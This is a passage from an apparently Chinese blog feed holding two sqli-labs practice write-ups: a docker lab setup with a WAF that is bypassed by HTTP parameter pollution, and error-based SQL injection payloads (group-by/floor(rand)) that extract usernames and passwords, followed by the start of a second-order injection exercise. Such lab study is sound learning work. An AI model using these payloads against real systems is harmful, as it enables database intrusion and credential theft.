&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">web&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">waf&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">80&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">80&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">web:web&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">waf:waf&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./etc/nginx_default.conf:/etc/nginx/conf.d/default.conf&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">db&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;mysql:5.7.33&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">environment&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">MYSQL_ROOT_PASSWORD&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">toor&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">MYSQL_ROOT_HOST&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;%&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">3306&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">3306&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">web&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">db&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;php:5.3-apache&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;.:/var/www/html&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./etc/apache_default:/etc/apache2/sites-available/000-default.conf&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./etc/htaccess:/var/www/html/.htaccess&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">environment&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">DB_HOST&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">DB_PASS&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;toor&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">db:db&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">waf&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">db&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;tomcat:jre8-openjdk-bullseye&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./WAF/sqli-labs:/usr/local/tomcat/webapps&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;./mysql-connector-java.jar:/usr/local/tomcat/lib/mysql-connector-java.jar&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">db:db&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">web:web&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>添加&lt;code>waf&lt;/code>和&lt;code>reverseproxy&lt;/code>，&lt;code>waf&lt;/code>用&lt;code>tomcat&lt;/code>官方容器不需要配置，但源码&lt;code>index.jsp&lt;/code>里请求地址要改。还要从 MySQL 官网单独下载一个 &lt;code>mysql-connector-java&lt;/code> 的 jar 包挂载进去。&lt;/p>
&lt;p>&lt;code>reverseproxy&lt;/code> 用 &lt;code>nginx:mainline&lt;/code>，简单配一下反代规则。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-nginx" data-lang="nginx">&lt;span class="k">upstream&lt;/span> &lt;span class="s">lab&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kn">server&lt;/span> &lt;span class="s">web&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">upstream&lt;/span> &lt;span class="s">tomcat&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kn">server&lt;/span> &lt;span class="n">waf&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">server&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kn">listen&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kn">listen&lt;/span> &lt;span class="s">[::]:80&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kn">server_name&lt;/span> &lt;span class="s">localhost&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kn">location&lt;/span> &lt;span class="s">/&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kn">proxy_pass&lt;/span> &lt;span class="s">http://lab&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">Host&lt;/span> &lt;span class="nv">$http_host&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">X-Real-IP&lt;/span> &lt;span class="nv">$remote_addr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kn">location&lt;/span> &lt;span class="p">~&lt;/span> &lt;span class="sr">^/Less-(29|30|31|32)[a-zA-Z]?/&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kn">proxy_pass&lt;/span> &lt;span class="s">http://tomcat&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">Host&lt;/span> &lt;span class="nv">$http_host&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kn">proxy_set_header&lt;/span> &lt;span class="s">X-Real-IP&lt;/span> &lt;span class="nv">$remote_addr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>到这一步就应该能同时访问 WAF 和其他题目了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513140140027.png"
width="1339"
height="629"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513140140027_hu59b49e8b56be885038de39fb4bac57a5_457416_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513140140027_hu59b49e8b56be885038de39fb4bac57a5_457416_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513140140027"
class="gallery-image"
data-flex-grow="212"
data-flex-basis="510px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513140239000.png"
width="1395"
height="632"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513140239000_hu5e114f83468c3e0191de9526b05f3db1_450543_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513140239000_hu5e114f83468c3e0191de9526b05f3db1_450543_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513140239000"
class="gallery-image"
data-flex-grow="220"
data-flex-basis="529px"
>&lt;/p>
&lt;h3 id="重新解题">重新解题&lt;/h3>
&lt;p>审阅下WAF代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&amp;lt;%
// ... 略
String rex = &amp;#34;^\\d+$&amp;#34;;
Boolean match = id.matches(rex);
if(match==true) {
// ... 请求 web 服务
} else {
response.sendRedirect(&amp;#34;hacked.jsp&amp;#34;);
}
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>看起来无懈可击，正则匹配整个&lt;code>id&lt;/code>参数必须是纯数字。再看下 Less-29 原题代码，&lt;code>select * from users where id='$id' limit 0,1&lt;/code>，好了这题我确实不懂了，知识盲区。看别的大佬的题解：&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>问：&lt;/strong>&lt;code>index.php?id=1&amp;amp;id=2&lt;/code>，这时回显是&lt;code>id=1&lt;/code>还是&lt;code>id=2&lt;/code>呢？&lt;/p>
&lt;p>**答：**apache (php) 解析最后一个参数，即回显&lt;code>id=2&lt;/code>；tomcat (jsp) 解析第
一个参数，即回显&lt;code>id=1&lt;/code>。&lt;/p>
&lt;p>作者：Hyafinthus 链接：https://www.jianshu.com/p/46cb6c354de5&lt;/p>
&lt;/blockquote>
&lt;p>这是一个利用 &lt;code>apache+php&lt;/code> 和 &lt;code>tomcat+jsp&lt;/code> 对重名 query string 参数解析结果的绕过。我们尝试下 &lt;code>?id=1&amp;amp;id=2'&lt;/code>，成功绕过。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513143042849.png"
width="1334"
height="498"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513143042849_hu4cb981f7210b33b31a88be9915dd45b4_221345_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513143042849_hu4cb981f7210b33b31a88be9915dd45b4_221345_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513143042849"
class="gallery-image"
data-flex-grow="267"
data-flex-basis="642px"
>&lt;/p>
&lt;p>剩下就不多谈了，把注入的 payload 放到第二个参数里就可以绕过 WAF 的防御。&lt;/p>
&lt;p>最后补充一点如何判断服务器类型。一个主要的办法就是看 HTTP 响应里的 &lt;code>Server&lt;/code> 头——但一般多个服务器后端的情况下，更可能出现的是一个大反代服务去代理其他所有服务，根据 url 来匹配转发。这种情况下 &lt;code>Server&lt;/code> 头一般就固定是反代服务器了。在这题里是&lt;code>nginx/1.21.6&lt;/code>，我们看不到&lt;code>apache&lt;/code>和&lt;code>tomcat&lt;/code>。&lt;/p>
&lt;p>另一种方法是靠经验判断=。=一般来说，写 php 的喜欢配 apache 或者 nginx，写 jsp 的会优先考虑java的容器比如&lt;code>tomcat&lt;/code>。写 go 的一般裸奔或者配个 nginx 反代，Python 就可能是 uwsgi 或者别的实现 WSGI 协议的服务器或者裸奔，现在也可能有 ASGI 的服务器。这些只能靠对后端生态的了解来猜测了。如果是前后端分离架构的话，后端开发语言和环境的特征就更难找了。&lt;/p>
&lt;h2 id="less-30">Less-30&lt;/h2>
&lt;p>WAF，无错误回显，有正确回显，字符型注入双引号。&lt;/p>
&lt;p>可以考虑用 &lt;code>union select&lt;/code> 解决，WAF 绕过方法和 Less-29 一样。&lt;/p>
&lt;h2 id="less-31">Less-31&lt;/h2>
&lt;p>和 Less-30 一样。 WTF ？看了眼源码发现就多了一个右括号。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>时间有限，还得抓紧开始看自考的课程。今天就先这样意思意思，没别的意思。&lt;/p>
&lt;p>sqli-labs 的 WAF 感觉怪怪的，不像是之前见过的 php 的 WAF，绕过的思路感觉还是比较有趣的，反代形式的WAF如果不注意可能会被这个问题坑到。&lt;/p>
&lt;p>28题审阅源码才发现过滤方法有漏洞，测 SQL 注入问题的时候还得多准备点各种 payload。我感觉是有很大自动测的空间，可以自己写个测试脚本啥的，但 sqlmap 珠玉在前=。= 或许有机会看看 sqlmap 源码会有更多启发。&lt;/p>
&lt;p>今天就这样，辛苦我自己啦。&lt;/p></description></item><item><title>sqli-labs 实验记录 #4</title><link>https://nnnewb.github.io/blog/p/sqli-labs-training-4/</link><pubDate>Thu, 12 May 2022 17:23:32 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-training-4/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>惯例的前言，虽然没什么可说的。本篇从 page-2 开始，page-2 开头还是 21/22 这两题，base64 编码加上引号注入即可完成。正文从 23 开始。&lt;/p>
&lt;h2 id="less-23">Less-23&lt;/h2>
&lt;p>提示 error based, no comments。所以应该是屏蔽了 &lt;code>--&lt;/code>、&lt;code>#&lt;/code>和&lt;code>/**/&lt;/code>，所以注入要看SQL注入位置的后半句SQL怎么写的了。&lt;/p>
&lt;p>尝试用 &lt;code>extractvalue&lt;/code> 攻击发现不行。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">?id=1&amp;#39; and extractvalue(1,concat(&amp;#39;~&amp;#39;,password)) or &amp;#39;1&amp;#39;=&amp;#39;1
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>错误：&lt;code>Only constant XPATH queries are supported&lt;/code>，&lt;code>updatexml&lt;/code>也是一样。换成 &lt;code>group by&lt;/code> 法攻击（仅限 MySQL &amp;lt; 5.7.36）。注入&lt;code>1'&lt;/code>确认后面跟着的是&lt;code>LIMIT 0,1&lt;/code>。&lt;/p>
&lt;p>手工调试出一个预期的SQL：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 从 1&amp;#39; and 开始承接原查询
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">123&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 子查询包装，把子查询确保 payload 不影响原查询。
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 拼接如 username~password 的字符串，limit 避免子查询返回多行出错，也可枚举所有行。目的都是确保能触发 duplicate entry
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">floor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">all&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 构造个临时表，两行就够
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 在这里触发 duplicate entry 错误
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 避免 Every derived table must have its own alias 错误
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">-- 承接原查询的单引号，后面就是原查询的剩余部分了。
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>提取 Payload：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">?id=1&amp;#39; and (select 123 from (select count(*),concat((select concat(username,&amp;#39;~&amp;#39;,password) from users limit 0,1),&amp;#39;~&amp;#39;,floor(rand(14)*2)) x from (select 1 union all select 2) as t group by x) x) and &amp;#39;1&amp;#39;=&amp;#39;1
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512133709602.png"
width="1218"
height="435"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512133709602_hud8abda6fb5f8bd1652da864a56d4f695_198434_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512133709602_hud8abda6fb5f8bd1652da864a56d4f695_198434_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512133709602"
class="gallery-image"
data-flex-grow="280"
data-flex-basis="672px"
>&lt;/p>
&lt;p>成功&lt;/p>
&lt;h2 id="less-24">Less-24&lt;/h2>
&lt;p>提示 second degree injections ，但谷歌没有找到这个说法，但有另一个说法叫 second-order injection。摘自 portswigger：&lt;/p>
&lt;blockquote>
&lt;p>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.&lt;/p>
&lt;/blockquote>
&lt;p>再看页面：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512134251988.png"
width="1078"
height="479"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512134251988_hu0f2b151fbf573c8051608f0a58f64beb_100741_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512134251988_hu0f2b151fbf573c8051608f0a58f64beb_100741_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512134251988"
class="gallery-image"
data-flex-grow="225"
data-flex-basis="540px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512134257960.png"
width="721"
height="490"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512134257960_hu704286ccb7af4df42963ee95ae469ab7_119881_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512134257960_hu704286ccb7af4df42963ee95ae469ab7_119881_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512134257960"
class="gallery-image"
data-flex-grow="147"
data-flex-basis="353px"
>&lt;/p>
&lt;p>分别有注册和登陆两个位置，从 second-order injection 的描述来看，如果存在于 Less-24 的话，可能的情况就是在注册接口允许特殊字符比如 &lt;code>admin' or 1=1&lt;/code> 作为用户名。&lt;/p>
&lt;p>首先尝试了注册正常用户 &lt;code>test123&lt;/code> 并登陆，但登录后跳转&lt;code>login.php&lt;/code>却没有内容。看来没有更多提示了。&lt;/p>
&lt;p>再注册用户 &lt;code>test123'&amp;quot;&lt;/code>并登陆，跳转&lt;code>login.php&lt;/code> 依然没有内容。这就不懂了，没辙，审下源码。&lt;/p>
&lt;p>注册：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512140810273.png"
width="742"
height="241"
